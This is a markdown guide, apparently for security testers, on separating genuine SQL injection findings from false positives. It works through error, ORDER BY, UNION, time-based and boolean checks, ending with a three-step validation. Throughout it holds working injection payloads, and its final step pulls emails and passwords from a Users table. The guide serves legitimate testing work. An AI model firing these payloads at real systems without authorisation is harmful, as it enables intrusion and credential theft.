# SQL Injection False Positive Validation

## Common False Positives

### 1. Error Message ≠ SQL Injection
A database error page does NOT confirm SQL injection.
```bash
# Input: ' OR 1=1--
# Response: 500 Internal Server Error
# → INCONCLUSIVE (could be syntax error without injection)

# Compare:
' OR 1=1-- → 500
' OR 1=2-- → 500 (same error)
# → Likely just a syntax error, not injection
```

**Must show:** Different payloads produce DIFFERENT results.

### 2. ORDER BY "Success" 
```sql
' ORDER BY 1-- → 200
' ORDER BY 2-- → 200
' ORDER BY 100-- → 200 (still succeeds!)
```
If all ORDER BY values return 200, the parameter is NOT injectable — the `ORDER BY` is being treated as a literal string, not SQL.

### 3. UNION SELECT "Data" is API Default
```bash
# Input: ' UNION SELECT 1,2,3--
# Response: [{"id":1,"name":"2","description":"3"}]
# But also:
# Input: ' UNION SELECT 1,2,3--
# Response: [{"id":1,"name":"2","description":"3"}]
# Input: abcdef' UNION SELECT 1,2,3--
# Response: [{"id":1,"name":"2","description":"3"}] (SAME!)
# → FALSE POSITIVE: API returns default data regardless of injection
```

**Confirm:** Change UNION values and verify response changes:
```bash
# Test 1:
' UNION SELECT 999,888,777--
# Response should show 999, 888, 777

# Test 2:
' UNION SELECT 111,222,333--
# Response should show 111, 222, 333
```

### 4. Blind SQL "Delay" is Latency
```bash
# Baseline: 200ms
# SLEEP(5): 5200ms → Could be injection
# BUT also run with benign payload that takes 5s:
# If server is just slow sometimes → FALSE POSITIVE
```

**Confirm:** Run 3x baseline, 3x sleep payload, compare averages.

### 5. Boolean "Difference" is Random
```bash
' AND 1=1-- → {"data":[...5 items...]}
' AND 1=2-- → {"data":[...3 items...]}
```
Different result counts could be random (ads, timestamps, sessions).

**Confirm:** Run 3 times. Verify TRUE always returns more/full results, FALSE always returns fewer/empty.

## Confirmation Criteria

| Signal | Confident? |
|--------|------------|
| Different UNION values produce different output | ✅ Confirmed |
| Error message contains database version/query | ✅ Confirmed |
| Time delay > 3x baseline, consistent | ✅ Strong |
| Boolean TRUE/FALSE produces consistent different results | ✅ Strong |
| Single `'` causes error, double `''` resolves it | ✅ Strong |
| Error page but no control over content | ❌ Inconclusive |
| Same error for all payloads | ❌ False Positive |

## 3-Step Validation

### Step 1: Confirm Injection (not just error)
```bash
# These 3 should give different results:
' AND 1=1--
' AND 1=2--
'
# If all return same error → not injectable
# If 1=1 succeeds, 1=2 fails → injectable
```

### Step 2: Confirm Data Control (for UNION)
```bash
' UNION SELECT 1,2,3,4,5,6,7,8,9--
# Change values and verify response changes:
' UNION SELECT 11,22,33,44,55,66,77,88,99--
# Response must change accordingly
```

### Step 3: Extract Real Data
```bash
# If you can extract real data → confirmed
' UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9--
' UNION SELECT 1,email,password,4,5,6,7,8,9 FROM Users--
```
